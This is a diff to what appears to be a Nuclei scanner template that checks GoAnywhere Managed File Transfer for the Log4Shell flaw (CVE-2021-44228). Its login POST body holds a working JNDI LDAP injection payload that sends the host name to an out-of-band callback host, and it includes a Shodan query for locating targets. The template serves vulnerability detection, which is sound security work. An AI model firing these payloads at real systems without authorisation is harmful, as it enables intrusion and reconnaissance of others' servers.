@@ -15,16 +15,19 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    max-request: 2
     shodan-query: http.html:"GoAnywhere Managed File Transfer"
-    verified: "true"
+    verified: true
   tags: cve,cve2021,jndi,log4j,rce,oast,goanywhere,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
       - |
         GET /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
-
       - |
         POST /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
@@ -32,38 +35,43 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/goanywhere/auth/Login.xhtml
 
-        formPanel%3AloginGrid%3Aname=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
+        formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
 
     cookie-reuse: true
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
 
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
       - type: regex
         name: view
-        part: body
         group: 1
         regex:
           - 'javax\.faces\.ViewState:1" value="(.*)" autocomplete'
         internal: true
+        part: body
 
       - type: kval
         kval:
           - interactsh_ip # Print remote interaction IP in output
 
       - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
         part: interactsh_request
+
+      - type: regex
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
-
-# Enhanced by cs 2022/10/10
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
